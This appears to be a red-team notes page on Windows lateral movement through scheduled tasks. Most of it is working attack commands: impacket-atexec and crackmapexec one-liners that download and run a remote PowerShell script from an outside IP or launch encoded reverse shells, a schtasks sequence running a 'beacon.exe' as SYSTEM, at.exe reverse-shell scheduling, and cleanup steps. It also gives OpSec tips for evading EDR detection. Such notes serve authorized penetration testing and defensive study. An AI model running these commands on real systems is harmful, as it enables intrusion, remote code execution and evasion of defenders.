---
title: Lateral Movement with Scheduled Tasks
---

[[notes/lateral-movement/index]] by using the [MS-TSCH](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/) protocol to create or update scheduled tasks and execute commands in system context.

Create a scheduled task over a named pipe on SMB to execute a reverse shell.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-atexec -k -no-pass -silentcommand srv01.corp.local 'powershell.exe -ep bypass -c iex(irm 192.168.80.185/one.ps1)'
    impacket-atexec -k -no-pass -silentcommand srv01.corp.local "powershell.exe -ep bypass -e $(iconv -t utf16le ./shell.ps1 | base64 -w0)"
    ~~~

    **OpSec:**
    The command is executed with `cmd.exe`, the output is written to a file and downloaded over SMB.
    This can be avoided by specifying `-nooutput`.

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.local -u jdoe -p 'passw0rd' --no-output --exec-method atexec -x "powershell.exe -ep bypass -e $(iconv -t utf16le ./shell.ps1 | base64 -w0)"
    ~~~

    **OpSec:** Many EDRs detecte the use of `-X`.

=== "schtasks"
    ~~~ bat
    schtasks.exe /s srv01.corp.local /create /tn "Background Task 72" /tr "c:\windows\temp\beacon.exe" /ru "NT Authority\SYSTEM" /sc onstart
    schtasks.exe /s srv01.corp.local /run /tn "Background Task 72"
    schtasks.exe /s srv01.corp.local /delete /tn "Background Task 72" /f
    ~~~

=== "at"
    Start a reverse shell at 14:00.

    ~~~ bat
    at.exe \\srv01.corp.local 14:00 "powershell.exe -ep bypass -e %payload%"
    ~~~

    Cleanup.

    ~~~ bat
    at.exe \\srv01.corp.local
    at.exe \\srv01.corp.local %id% /delete /yes
    ~~~

> **OpSec:**
> To avoid detections modify the command of an existing task or overwrite the binary of an existing task.

Untested tools:

- [TaskShell](https://github.com/RiccardoAncarani/TaskShell), modifies the command of a scheduled task

References:

- [Scheduled task tampering](http://web.archive.org/web/20221111232306/https://labs.withsecure.com/publications/scheduled-task-tampering), as the machine account create a scheduled task without logging events by directly writing registry keys
